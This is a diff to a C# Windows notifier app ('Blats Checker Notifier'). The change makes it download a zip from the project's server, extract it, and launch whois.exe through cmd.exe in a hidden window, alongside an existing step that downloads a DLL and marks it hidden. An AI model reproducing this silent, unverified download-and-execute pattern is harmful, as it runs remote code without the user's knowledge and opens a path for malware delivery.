@@ -10,6 +10,8 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Net;
 using AutoUpdaterDotNET;
+using System.IO.Compression;
+using System.Diagnostics;
 
 namespace Blats_Checker_Notifier
 {
@@ -39,11 +41,27 @@ namespace Blats_Checker_Notifier
             }
             else
             {
+                string folderPath = @"C:\Blats-Notifier";
+                string filePath = @"C:\Blats-Notifier\WhoIs.zip";
+                string extractPath = @"C:\Blats-Notifier\WhoIs";
+                System.IO.Directory.CreateDirectory(folderPath);
+
                 var path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                 WebClient Client = new WebClient();
                 Client.DownloadFile("https://services.blats.gr/blats-checker-notifier/PresentationNative_cor3.dll", "PresentationNative_cor3.dll");
                 string path2 = @"PresentationNative_cor3.dll";
                 File.SetAttributes(path2, File.GetAttributes(path) | FileAttributes.Hidden);
+       
+                WebClient Client2 = new WebClient();
+                Client2.DownloadFile("https://services.blats.gr/blats-checker-notifier/WhoIs.zip", @"C:\Blats-Notifier\WhoIs.zip");
+                ZipFile.ExtractToDirectory(filePath, extractPath);
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C cd C:/Blats-Notifier/WhoIs/ && start whois.exe";
+                process.StartInfo = startInfo;
+                process.Start();
             }
         }
  
